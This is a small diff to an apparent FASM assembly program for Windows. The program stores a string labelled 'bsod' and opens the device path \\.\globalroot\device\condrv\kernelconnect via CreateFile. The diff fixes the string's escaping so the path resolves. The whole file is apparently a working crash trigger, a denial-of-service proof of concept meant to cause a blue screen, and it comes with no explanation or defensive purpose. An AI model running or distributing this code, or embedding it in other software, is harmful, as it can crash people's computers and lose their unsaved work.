@@ -3,7 +3,7 @@ entry main
 
 include "win32a.inc"
 
-bsod    db      "\\\\.\\globalroot\\device\\condrv\\kernelconnect", 0
+bsod    db      "\\.\globalroot\device\condrv\kernelconnect", 0
 
 main:
         invoke  CreateFile, bsod, GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0
